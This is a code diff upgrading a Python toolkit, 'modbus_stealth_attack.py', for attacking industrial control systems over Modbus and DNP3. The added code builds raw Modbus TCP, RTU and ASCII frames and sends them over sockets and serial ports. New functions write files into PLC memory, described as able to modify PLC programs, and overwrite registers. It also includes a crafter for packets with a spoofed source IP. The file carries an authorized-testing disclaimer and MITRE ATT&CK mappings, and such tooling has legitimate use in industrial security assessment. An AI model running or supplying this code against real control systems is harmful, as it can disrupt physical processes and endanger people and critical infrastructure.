@@ -3,7 +3,7 @@
 modbus_stealth_attack.py
 Modbus/DNP3 Industrial Protocol Security Assessment Toolkit
 Author: Ridpath
-Version: 2.1
+Version: 3.0
 
 DISCLAIMER:
 FOR AUTHORIZED SECURITY RESEARCH AND PENETRATION TESTING ONLY.
@@ -11,8 +11,16 @@ Use only on systems you own or have explicit written permission to test.
 
 Purpose:
 Advanced industrial protocol security assessment with comprehensive
-reporting, error handling, and multi-protocol support for critical
-infrastructure security testing.
+reporting, error handling, and multi-protocol support (TCP/RTU/ASCII) for 
+critical infrastructure security testing.
+
+Enhanced Features:
+- Full Modbus TCP, RTU, and ASCII support
+- Complete function code coverage (0x01-0x18)
+- Proper packet structure validation per Modbus specification
+- File transfer operations (0x14-0x17)
+- Enhanced MITRE ATT&CK mapping
+- Complete type annotations
 """
 
 import asyncio
@@ -26,9 +34,11 @@ import socket
 import ipaddress
 import base64
 import configparser
-from typing import List, Optional, Dict, Any, Generator
-from dataclasses import dataclass
-from enum import Enum
+import struct
+import serial
+from typing import List, Optional, Dict, Any, Generator, Union, Tuple
+from dataclasses import dataclass, field
+from enum import Enum, IntEnum
 from concurrent.futures import ThreadPoolExecutor
 from scapy.all import *
 from scapy.layers.dnp3 import DNP3
@@ -51,16 +61,64 @@ except ImportError:
     ML_AVAILABLE = False
 
 class ProtocolType(Enum):
+    """Industrial protocol types supported"""
     MODBUS_TCP = "modbus_tcp"
+    MODBUS_RTU = "modbus_rtu"
+    MODBUS_ASCII = "modbus_ascii"
     DNP3 = "dnp3"
     OPC_UA = "opc_ua"
     ETHERNET_IP = "ethernet_ip"
 
+class ModbusTransportMode(Enum):
+    """Modbus transport layer modes"""
+    TCP = "tcp"
+    RTU = "rtu"
+    ASCII = "ascii"
+
+class ModbusFunctionCode(IntEnum):
+    """
+    Complete Modbus function code specification per Modbus Application Protocol v1.1b3
+    Ref: https://modbus.org/docs/Modbus_Application_Protocol_V1_1b3.pdf
+    """
+    READ_COILS = 0x01
+    READ_DISCRETE_INPUTS = 0x02
+    READ_HOLDING_REGISTERS = 0x03
+    READ_INPUT_REGISTERS = 0x04
+    WRITE_SINGLE_COIL = 0x05
+    WRITE_SINGLE_REGISTER = 0x06
+    READ_EXCEPTION_STATUS = 0x07
+    DIAGNOSTICS = 0x08
+    GET_COMM_EVENT_COUNTER = 0x0B
+    GET_COMM_EVENT_LOG = 0x0C
+    WRITE_MULTIPLE_COILS = 0x0F
+    WRITE_MULTIPLE_REGISTERS = 0x10
+    REPORT_SERVER_ID = 0x11
+    READ_FILE_RECORD = 0x14
+    WRITE_FILE_RECORD = 0x15
+    MASK_WRITE_REGISTER = 0x16
+    READ_WRITE_MULTIPLE_REGISTERS = 0x17
+    READ_FIFO_QUEUE = 0x18
+    ENCAPSULATED_INTERFACE_TRANSPORT = 0x2B
+
+class ModbusExceptionCode(IntEnum):
+    """Modbus exception response codes"""
+    ILLEGAL_FUNCTION = 0x01
+    ILLEGAL_DATA_ADDRESS = 0x02
+    ILLEGAL_DATA_VALUE = 0x03
+    SERVER_DEVICE_FAILURE = 0x04
+    ACKNOWLEDGE = 0x05
+    SERVER_DEVICE_BUSY = 0x06
+    MEMORY_PARITY_ERROR = 0x08
+    GATEWAY_PATH_UNAVAILABLE = 0x0A
+    GATEWAY_TARGET_NO_RESPONSE = 0x0B
+
 class AttackTechnique(Enum):
+    """Attack technique classification"""
     RECONNAISSANCE = "reconnaissance"
     COIL_WRITE = "coil_write"
     REGISTER_READ = "register_read"
     REGISTER_WRITE = "register_write"
+    FILE_OPERATION = "file_operation"
     SPOOFING = "spoofing"
     DOS = "denial_of_service"
     FUZZING = "fuzzing"
@@ -68,7 +126,106 @@ class AttackTechnique(Enum):
     REPLAY = "replay"
 
 @dataclass
+class ModbusPacket:
+    """Represents a Modbus packet structure for validation"""
+    transaction_id: int = 0
+    protocol_id: int = 0
+    length: int = 0
+    unit_id: int = 1
+    function_code: int = 0
+    data: bytes = b''
+    
+    def to_tcp_bytes(self) -> bytes:
+        """Convert packet to Modbus TCP format (MBAP + PDU)"""
+        pdu = struct.pack('B', self.function_code) + self.data
+        mbap = struct.pack('>HHHB', 
+            self.transaction_id,
+            self.protocol_id,
+            len(pdu) + 1,
+            self.unit_id
+        )
+        return mbap + pdu
+    
+    def to_rtu_bytes(self) -> bytes:
+        """Convert packet to Modbus RTU format (Unit ID + PDU + CRC)"""
+        frame = struct.pack('B', self.unit_id) + struct.pack('B', self.function_code) + self.data
+        crc = self._calculate_crc16(frame)
+        return frame + struct.pack('<H', crc)
+    
+    def to_ascii_bytes(self) -> bytes:
+        """Convert packet to Modbus ASCII format"""
+        frame = struct.pack('B', self.unit_id) + struct.pack('B', self.function_code) + self.data
+        lrc = self._calculate_lrc(frame)
+        hex_frame = ''.join(f'{b:02X}' for b in frame) + f'{lrc:02X}'
+        return b':' + hex_frame.encode() + b'\r\n'
+    
+    @staticmethod
+    def _calculate_crc16(data: bytes) -> int:
+        """Calculate CRC-16 for Modbus RTU"""
+        crc = 0xFFFF
+        for byte in data:
+            crc ^= byte
+            for _ in range(8):
+                if crc & 0x0001:
+                    crc = (crc >> 1) ^ 0xA001
+                else:
+                    crc >>= 1
+        return crc
+    
+    @staticmethod
+    def _calculate_lrc(data: bytes) -> int:
+        """Calculate LRC for Modbus ASCII"""
+        lrc = sum(data) & 0xFF
+        return ((lrc ^ 0xFF) + 1) & 0xFF
+    
+    @classmethod
+    def validate_tcp_packet(cls, data: bytes) -> Tuple[bool, Optional[str]]:
+        """
+        Validate Modbus TCP packet structure per specification
+        Returns: (is_valid, error_message)
+        """
+        if len(data) < 8:
+            return False, "Packet too short (minimum 8 bytes for MBAP header + function code)"
+        
+        try:
+            transaction_id, protocol_id, length, unit_id = struct.unpack('>HHHB', data[:7])
+            
+            if protocol_id != 0:
+                return False, f"Invalid protocol ID {protocol_id} (must be 0 for Modbus)"
+            
+            if length < 2:
+                return False, f"Invalid length field {length} (minimum 2)"
+            
+            if len(data) < 7 + length:
+                return False, f"Packet length mismatch: expected {7 + length}, got {len(data)}"
+            
+            function_code = data[7]
+            if function_code > 0x7F and function_code < 0x80:
+                return False, f"Invalid function code {function_code}"
+            
+            return True, None
+            
+        except struct.error as e:
+            return False, f"Packet parsing error: {e}"
+    
+    @classmethod
+    def validate_rtu_packet(cls, data: bytes) -> Tuple[bool, Optional[str]]:
+        """Validate Modbus RTU packet structure with CRC check"""
+        if len(data) < 4:
+            return False, "RTU packet too short (minimum 4 bytes: unit_id + function_code + CRC)"
+        
+        frame = data[:-2]
+        received_crc = struct.unpack('<H', data[-2:])[0]
+        calculated_crc = cls._calculate_crc16(frame)
+        
+        if received_crc != calculated_crc:
+            return False, f"CRC mismatch: expected {calculated_crc:04X}, got {received_crc:04X}"
+        
+        return True, None
+
+@dataclass
 class SecurityEvent:
+    """Security event data structure with MITRE ATT&CK mapping"""
     technique: AttackTechnique
     target_ip: str
     port: int
@@ -79,25 +236,131 @@ class SecurityEvent:
     error: Optional[str] = None
     mitre_technique: str = ""
     mitre_tactic: str = ""
+    mitre_subtechnique: Optional[str] = None
+    
+    def to_dict(self) -> Dict[str, Any]:
+        """Convert event to dictionary for JSON serialization"""
+        return {
+            "technique": self.technique.value,
+            "target_ip": self.target_ip,
+            "port": self.port,
+            "protocol": self.protocol.value,
+            "timestamp": self.timestamp,
+            "success": self.success,
+            "details": self.details,
+            "error": self.error,
+            "mitre_technique": self.mitre_technique,
+            "mitre_tactic": self.mitre_tactic,
+            "mitre_subtechnique": self.mitre_subtechnique
+        }
 
 class IndustrialProtocolAttacker:
-    def __init__(self, target_ip: Optional[str] = None, port: int = 502, protocol: ProtocolType = ProtocolType.MODBUS_TCP):
-        # Validate IP address
+    """
+    Industrial Protocol Security Assessment Framework
+    
+    Supports comprehensive Modbus (TCP/RTU/ASCII) and DNP3 security testing
+    with full function code coverage, packet validation, and MITRE ATT&CK mapping.
+    
+    Attributes:
+        target_ip: Target device IP address (for TCP-based protocols)
+        port: Target port number
+        protocol: Protocol type (MODBUS_TCP/RTU/ASCII, DNP3, etc.)
+        transport_mode: Transport layer mode for Modbus
+        serial_port: Serial port for RTU/ASCII modes
+        serial_config: Serial configuration dict
+        dry_run: Dry run mode flag
+        json_log_file: Optional JSON telemetry log file path
+        unit_id: Modbus unit/slave ID (default: 1)
+        transaction_id: Modbus TCP transaction counter
+    """
+    
+    def __init__(
+        self, 
+        target_ip: Optional[str] = None, 
+        port: int = 502, 
+        protocol: ProtocolType = ProtocolType.MODBUS_TCP,
+        transport_mode: ModbusTransportMode = ModbusTransportMode.TCP,
+        serial_port: Optional[str] = None,
+        serial_config: Optional[Dict[str, Any]] = None
+    ) -> None:
+        """
+        Initialize Industrial Protocol Attacker
+        
+        Args:
+            target_ip: Target IP address (required for TCP)
+            port: Target port (default: 502 for Modbus TCP)
+            protocol: Protocol type
+            transport_mode: Transport mode for Modbus (TCP/RTU/ASCII)
+            serial_port: Serial port path for RTU/ASCII (e.g., '/dev/ttyUSB0', 'COM3')
+            serial_config: Serial configuration dict with keys:
+                - baudrate (default: 9600)
+                - bytesize (default: 8)
+                - parity (default: 'N')
+                - stopbits (default: 1)
+                - timeout (default: 1.0)
+        
+        Raises:
+            ValueError: If IP address invalid or serial port required but not provided
+        """
         if target_ip:
             try:
                 ipaddress.ip_address(target_ip)
             except ValueError:
                 raise ValueError(f"Invalid IP address: {target_ip}")
         
-        self.target_ip = target_ip
-        self.port = port
-        self.protocol = protocol
-        self.dry_run = False
-        self.json_log_file = None
-        self.fuzz_success_history = []  # For ML-assisted fuzzing
+        if transport_mode in [ModbusTransportMode.RTU, ModbusTransportMode.ASCII]:
+            if not serial_port:
+                raise ValueError(f"Serial port required for {transport_mode.value} mode")
+        
+        self.target_ip: Optional[str] = target_ip
+        self.port: int = port
+        self.protocol: ProtocolType = protocol
+        self.transport_mode: ModbusTransportMode = transport_mode
+        self.serial_port: Optional[str] = serial_port
+        self.serial_connection: Optional[serial.Serial] = None
+        
+        self.serial_config: Dict[str, Any] = serial_config or {
+            'baudrate': 9600,
+            'bytesize': 8,
+            'parity': 'N',
+            'stopbits': 1,
+            'timeout': 1.0
+        }
+        
+        self.dry_run: bool = False
+        self.json_log_file: Optional[str] = None
+        self.fuzz_success_history: List[Tuple[int, Packet]] = []
+        self.unit_id: int = 1
+        self.transaction_id: int = 0
+        
         self.setup_logging()
         
-    def setup_logging(self):
+        if self.transport_mode in [ModbusTransportMode.RTU, ModbusTransportMode.ASCII]:
+            self._init_serial_connection()
+        
+    def _init_serial_connection(self) -> None:
+        """Initialize serial connection for RTU/ASCII modes"""
+        try:
+            self.serial_connection = serial.Serial(
+                port=self.serial_port,
+                baudrate=self.serial_config['baudrate'],
+                bytesize=self.serial_config['bytesize'],
+                parity=self.serial_config['parity'],
+                stopbits=self.serial_config['stopbits'],
+                timeout=self.serial_config['timeout']
+            )
+            self.logger.info(f"Serial connection established on {self.serial_port}")
+        except serial.SerialException as e:
+            self.logger.error(f"Failed to open serial port {self.serial_port}: {e}")
+            raise
+    
+    def close_serial_connection(self) -> None:
+        """Close serial connection if open"""
+        if self.serial_connection and self.serial_connection.is_open:
+            self.serial_connection.close()
+            self.logger.info("Serial connection closed")
+    
+    def setup_logging(self) -> None:
         """Configure comprehensive logging"""
         logging.basicConfig(
             level=logging.INFO,
@@ -117,20 +380,14 @@ class IndustrialProtocolAttacker:
         except ImportError:
             self.logger.error("pymodbus not installed")
     
-    def log_security_event(self, event: SecurityEvent):
-        """Log security event in structured format with optional encryption"""
-        event_dict = {
-            "technique": event.technique.value,
-            "target_ip": event.target_ip,
-            "port": event.port,
-            "protocol": event.protocol.value,
-            "timestamp": event.timestamp,
-            "success": event.success,
-            "details": event.details,
-            "error": event.error,
-            "mitre_technique": event.mitre_technique,
-            "mitre_tactic": event.mitre_tactic
-        }
+    def log_security_event(self, event: SecurityEvent) -> None:
+        """
+        Log security event in structured format with optional encryption
+        
+        Args:
+            event: SecurityEvent instance to log
+        """
+        event_dict = event.to_dict()
         
         # Console logging
         if event.success:
@@ -142,12 +399,72 @@ class IndustrialProtocolAttacker:
         if self.json_log_file:
             try:
                 event_str = json.dumps(event_dict)
-                # Basic base64 encoding for "encryption"
                 encoded = base64.b64encode(event_str.encode()).decode()
                 with open(self.json_log_file, "a") as f:
                     f.write(encoded + "\n")
             except Exception as e:
                 self.logger.error(f"Failed to write JSON telemetry: {e}")
+    
+    def _get_next_transaction_id(self) -> int:
+        """Get next Modbus TCP transaction ID"""
+        self.transaction_id = (self.transaction_id + 1) % 65536
+        return self.transaction_id
+    
+    def _send_modbus_packet(self, packet: ModbusPacket) -> Optional[bytes]:
+        """
+        Send Modbus packet based on transport mode
+        
+        Args:
+            packet: ModbusPacket instance
+            
+        Returns:
+            Response bytes if successful, None otherwise
+        """
+        if self.dry_run:
+            self.logger.warning("DRY RUN - No packets sent")
+            return b'\x00' * 8
+        
+        try:
+            if self.transport_mode == ModbusTransportMode.TCP:
+                packet.transaction_id = self._get_next_transaction_id()
+                data = packet.to_tcp_bytes()
+                
+                is_valid, error = ModbusPacket.validate_tcp_packet(data)
+                if not is_valid:
+                    self.logger.error(f"Invalid TCP packet: {error}")
+                    return None
+                
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(5.0)
+                sock.connect((self.target_ip, self.port))
+                sock.sendall(data)
+                response = sock.recv(1024)
+                sock.close()
+                return response
+                
+            elif self.transport_mode == ModbusTransportMode.RTU:
+                data = packet.to_rtu_bytes()
+                
+                is_valid, error = ModbusPacket.validate_rtu_packet(data)
+                if not is_valid:
+                    self.logger.error(f"Invalid RTU packet: {error}")
+                    return None
+                
+                self.serial_connection.write(data)
+                time.sleep(0.1)
+                response = self.serial_connection.read(256)
+                return response
+                
+            elif self.transport_mode == ModbusTransportMode.ASCII:
+                data = packet.to_ascii_bytes()
+                self.serial_connection.write(data)
+                time.sleep(0.1)
+                response = self.serial_connection.read_until(b'\r\n')
+                return response
+                
+        except Exception as e:
+            self.logger.error(f"Failed to send packet: {e}")
+            return None
 
     async def read_coils(self, start_address: int, count: int = 1):
         """
@@ -477,7 +794,376 @@ class IndustrialProtocolAttacker:
             self.log_security_event(event)
             return []
 
-    def craft_spoofed_modbus_packet(self, source_ip: str, coil: int, value: bool, flags: Optional[str] = None):
+    async def read_file_record(self, file_number: int, record_number: int, record_length: int) -> Optional[bytes]:
+        """
+        Read file record (Function Code 0x14)
+        
+        Allows reading data from files stored in PLC memory. This is an advanced
+        function used by some PLCs for program and data storage.
+        
+        Args:
+            file_number: File number (0x0001-0xFFFF)
+            record_number: Starting record number within file (0x0000-0x270F)
+            record_length: Number of records to read (maximum 0xF5 per sub-request)
+        
+        Returns:
+            Raw file data bytes if successful, None otherwise
+            
+        MITRE ATT&CK: T0801 (Monitor Process State), T0861 (Point & Tag Identification)
+        """
+        self.logger.info(f"Reading file record: file={file_number}, record={record_number}, length={record_length}")
+        
+        event = SecurityEvent(
+            technique=AttackTechnique.FILE_OPERATION,
+            target_ip=self.target_ip,
+            port=self.port,
+            protocol=self.protocol,
+            timestamp=time.time(),
+            success=False,
+            details={
+                "operation": "read_file_record",
+                "file_number": file_number,
+                "record_number": record_number,
+                "record_length": record_length
+            },
+            mitre_technique="T0801",
+            mitre_tactic="Collection",
+            mitre_subtechnique="Point & Tag Identification"
+        )
+        
+        if self.dry_run:
+            self.logger.warning("DRY RUN - No packets sent")
+            event.details["dry_run"] = True
+            event.success = True
+            self.log_security_event(event)
+            return b'\x00' * (record_length * 2)
+        
+        try:
+            sub_request = struct.pack('>BHHH', 
+                0x06,
+                file_number,
+                record_number,
+                record_length
+            )
+            
+            request_data = struct.pack('B', len(sub_request)) + sub_request
+            
+            packet = ModbusPacket(
+                unit_id=self.unit_id,
+                function_code=ModbusFunctionCode.READ_FILE_RECORD,
+                data=request_data
+            )
+            
+            response = self._send_modbus_packet(packet)
+            
+            if response and len(response) > 8:
+                resp_byte_count = response[8] if self.transport_mode == ModbusTransportMode.TCP else response[1]
+                file_data = response[9:9+resp_byte_count] if self.transport_mode == ModbusTransportMode.TCP else response[2:2+resp_byte_count]
+                
+                self.logger.info(f"Successfully read {len(file_data)} bytes from file {file_number}")
+                event.success = True
+                event.details["bytes_read"] = len(file_data)
+                self.log_security_event(event)
+                return file_data
+            else:
+                error_msg = "Invalid or empty response"
+                self.logger.error(error_msg)
+                event.error = error_msg
+                self.log_security_event(event)
+                return None
+                
+        except Exception as e:
+            error_msg = f"Read file record failed: {e}"
+            self.logger.error(error_msg)
+            event.error = error_msg
+            self.log_security_event(event)
+            return None
+
+    async def write_file_record(self, file_number: int, record_number: int, data: bytes) -> bool:
+        """
+        Write file record (Function Code 0x15)
+        
+        Writes data to files stored in PLC memory. Can be used to modify PLC
+        programs, configuration, or data files.
+        
+        Args:
+            file_number: File number (0x0001-0xFFFF)
+            record_number: Starting record number within file (0x0000-0x270F)
+            data: Data bytes to write (must be even length, max 245 bytes)
+        
+        Returns:
+            True if successful, False otherwise
+            
+        MITRE ATT&CK: T0836 (Modify Parameter), T0873 (Project File Infection)
+        """
+        self.logger.warning(f"Writing file record: file={file_number}, record={record_number}, size={len(data)} - HIGH IMPACT")
+        
+        event = SecurityEvent(
+            technique=AttackTechnique.FILE_OPERATION,
+            target_ip=self.target_ip,
+            port=self.port,
+            protocol=self.protocol,
+            timestamp=time.time(),
+            success=False,
+            details={
+                "operation": "write_file_record",
+                "file_number": file_number,
+                "record_number": record_number,
+                "data_length": len(data)
+            },
+            mitre_technique="T0836",
+            mitre_tactic="Impair Process Control",
+            mitre_subtechnique="Project File Infection"
+        )
+        
+        if self.dry_run:
+            self.logger.warning("DRY RUN - No packets sent")
+            event.details["dry_run"] = True
+            event.success = True
+            self.log_security_event(event)
+            return True
+        
+        if len(data) % 2 != 0:
+            error_msg = "Data length must be even (word-aligned)"
+            self.logger.error(error_msg)
+            event.error = error_msg
+            self.log_security_event(event)
+            return False
+        
+        if len(data) > 245:
+            error_msg = f"Data too large: {len(data)} bytes (max 245)"
+            self.logger.error(error_msg)
+            event.error = error_msg
+            self.log_security_event(event)
+            return False
+        
+        try:
+            record_length = len(data) // 2
+            
+            sub_request = struct.pack('>BHHH',
+                0x06,
+                file_number,
+                record_number,
+                record_length
+            ) + data
+            
+            request_data = struct.pack('B', len(sub_request)) + sub_request
+            
+            packet = ModbusPacket(
+                unit_id=self.unit_id,
+                function_code=ModbusFunctionCode.WRITE_FILE_RECORD,
+                data=request_data
+            )
+            
+            response = self._send_modbus_packet(packet)
+            
+            if response and len(response) >= 8:
+                self.logger.info(f"Successfully wrote {len(data)} bytes to file {file_number}")
+                event.success = True
+                self.log_security_event(event)
+                return True
+            else:
+                error_msg = "Write confirmation not received"
+                self.logger.error(error_msg)
+                event.error = error_msg
+                self.log_security_event(event)
+                return False
+                
+        except Exception as e:
+            error_msg = f"Write file record failed: {e}"
+            self.logger.error(error_msg)
+            event.error = error_msg
+            self.log_security_event(event)
+            return False
+
+    async def mask_write_register(self, address: int, and_mask: int, or_mask: int) -> bool:
+        """
+        Mask write register (Function Code 0x16)
+        
+        Modifies specific bits in a holding register using AND/OR masks.
+        Result = (CurrentValue AND and_mask) OR (or_mask AND (NOT and_mask))
+        
+        Args:
+            address: Register address (0x0000-0xFFFF)
+            and_mask: AND mask (16-bit)
+            or_mask: OR mask (16-bit)
+        
+        Returns:
+            True if successful, False otherwise
+            
+        MITRE ATT&CK: T0836 (Modify Parameter)
+        """
+        self.logger.info(f"Mask write register: address={address}, AND={and_mask:04X}, OR={or_mask:04X}")
+        
+        event = SecurityEvent(
+            technique=AttackTechnique.REGISTER_WRITE,
+            target_ip=self.target_ip,
+            port=self.port,
+            protocol=self.protocol,
+            timestamp=time.time(),
+            success=False,
+            details={
+                "operation": "mask_write_register",
+                "address": address,
+                "and_mask": f"0x{and_mask:04X}",
+                "or_mask": f"0x{or_mask:04X}"
+            },
+            mitre_technique="T0836",
+            mitre_tactic="Impair Process Control"
+        )
+        
+        if self.dry_run:
+            self.logger.warning("DRY RUN - No packets sent")
+            event.details["dry_run"] = True
+            event.success = True
+            self.log_security_event(event)
+            return True
+        
+        try:
+            request_data = struct.pack('>HHH', address, and_mask, or_mask)
+            
+            packet = ModbusPacket(
+                unit_id=self.unit_id,
+                function_code=ModbusFunctionCode.MASK_WRITE_REGISTER,
+                data=request_data
+            )
+            
+            response = self._send_modbus_packet(packet)
+            
+            if response and len(response) >= 8:
+                self.logger.info(f"Successfully mask-wrote register {address}")
+                event.success = True
+                self.log_security_event(event)
+                return True
+            else:
+                error_msg = "Mask write confirmation not received"
+                self.logger.error(error_msg)
+                event.error = error_msg
+                self.log_security_event(event)
+                return False
+                
+        except Exception as e:
+            error_msg = f"Mask write register failed: {e}"
+            self.logger.error(error_msg)
+            event.error = error_msg
+            self.log_security_event(event)
+            return False
+
+    async def read_write_multiple_registers(
+        self, 
+        read_address: int, 
+        read_count: int,
+        write_address: int, 
+        write_values: List[int]
+    ) -> Optional[List[int]]:
+        """
+        Read/Write multiple registers (Function Code 0x17)
+        
+        Performs atomic read and write operations in a single transaction.
+        Useful for synchronized data exchange with PLCs.
+        
+        Args:
+            read_address: Starting address for read operation
+            read_count: Number of registers to read (max 125)
+            write_address: Starting address for write operation
+            write_values: List of values to write (max 121 registers)
+        
+        Returns:
+            List of read register values if successful, None otherwise
+            
+        MITRE ATT&CK: T0836 (Modify Parameter), T0855 (Unauthorized Command Message)
+        """
+        self.logger.info(f"Read/Write multiple: read[{read_address}:{read_address+read_count}], write[{write_address}] {len(write_values)} values")
+        
+        event = SecurityEvent(
+            technique=AttackTechnique.REGISTER_WRITE,
+            target_ip=self.target_ip,
+            port=self.port,
+            protocol=self.protocol,
+            timestamp=time.time(),
+            success=False,
+            details={
+                "operation": "read_write_multiple_registers",
+                "read_address": read_address,
+                "read_count": read_count,
+                "write_address": write_address,
+                "write_count": len(write_values)
+            },
+            mitre_technique="T0855",
+            mitre_tactic="Execution"
+        )
+        
+        if self.dry_run:
+            self.logger.warning("DRY RUN - No packets sent")
+            event.details["dry_run"] = True
+            event.success = True
+            self.log_security_event(event)
+            return [0] * read_count
+        
+        if read_count > 125:
+            error_msg = f"Read count {read_count} exceeds maximum (125)"
+            self.logger.error(error_msg)
+            event.error = error_msg
+            self.log_security_event(event)
+            return None
+        
+        if len(write_values) > 121:
+            error_msg = f"Write count {len(write_values)} exceeds maximum (121)"
+            self.logger.error(error_msg)
+            event.error = error_msg
+            self.log_security_event(event)
+            return None
+        
+        try:
+            write_byte_count = len(write_values) * 2
+            write_data = b''.join(struct.pack('>H', val) for val in write_values)
+            
+            request_data = struct.pack('>HHHHB',
+                read_address,
+                read_count,
+                write_address,
+                len(write_values),
+                write_byte_count
+            ) + write_data
+            
+            packet = ModbusPacket(
+                unit_id=self.unit_id,
+                function_code=ModbusFunctionCode.READ_WRITE_MULTIPLE_REGISTERS,
+                data=request_data
+            )
+            
+            response = self._send_modbus_packet(packet)
+            
+            if response and len(response) > 9:
+                byte_count = response[8] if self.transport_mode == ModbusTransportMode.TCP else response[1]
+                register_count = byte_count // 2
+                
+                registers = []
+                offset = 9 if self.transport_mode == ModbusTransportMode.TCP else 2
+                for i in range(register_count):
+                    reg_val = struct.unpack('>H', response[offset+i*2:offset+i*2+2])[0]
+                    registers.append(reg_val)
+                
+                self.logger.info(f"Successfully read {len(registers)} registers and wrote {len(write_values)} registers")
+                event.success = True
+                event.details["registers_read"] = registers
+                self.log_security_event(event)
+                return registers
+            else:
+                error_msg = "Invalid response"
+                self.logger.error(error_msg)
+                event.error = error_msg
+                self.log_security_event(event)
+                return None
+                
+        except Exception as e:
+            error_msg = f"Read/Write multiple registers failed: {e}"
+            self.logger.error(error_msg)
+            event.error = error_msg
+            self.log_security_event(event)
+            return None
+
+    def craft_spoofed_modbus_packet(self, source_ip: str, coil: int, value: bool, flags: Optional[str] = None) -> Packet:
         """Craft raw Modbus packet with spoofed source IP"""
         if value:
             coil_value = 0xFF00
